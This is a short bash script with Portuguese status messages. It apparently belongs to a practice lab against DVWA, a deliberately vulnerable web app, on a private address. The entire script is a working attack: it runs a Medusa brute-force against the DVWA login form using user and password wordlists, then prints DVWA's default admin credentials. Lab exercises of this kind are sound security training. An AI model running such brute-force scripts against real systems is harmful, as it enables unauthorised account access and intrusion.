#!/bin/bash
echo "[+] Iniciando ataque web (DVWA)..."
TARGET="192.168.1.18"

echo "[+] Executando força bruta no formulário de login..."
medusa -h $TARGET -U ../wordlists/users.txt -P ../wordlists/pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6

echo "[+] Credenciais padrão do DVWA:"
echo "URL: http://$TARGET/dvwa/login.php"
echo "Usuário: admin"
echo "Senha: password"

echo "[+] Ataque web concluído!"
